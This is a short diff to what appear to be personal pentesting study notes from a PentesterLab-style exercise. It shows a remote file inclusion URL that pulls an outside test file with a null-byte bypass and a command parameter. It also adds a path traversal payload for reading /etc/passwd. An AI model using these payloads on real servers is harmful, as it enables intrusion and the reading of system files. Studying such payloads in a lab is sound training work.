@@ -60,3 +60,8 @@ Extention bypassusing Null Byte - PHP versions before 5.5 are vulnerable to null
 FILE INCLUSION
 
 http://ptc-444a41be-8e806a8a.libcurl.so/?page=http://assets.pentesterlab.com/test_include_system.txt%00&c=[cmd]
+
+
+INTERESTING PAYLOAD EXAMPLE;
+
+/profile/../../../../etc/passwd
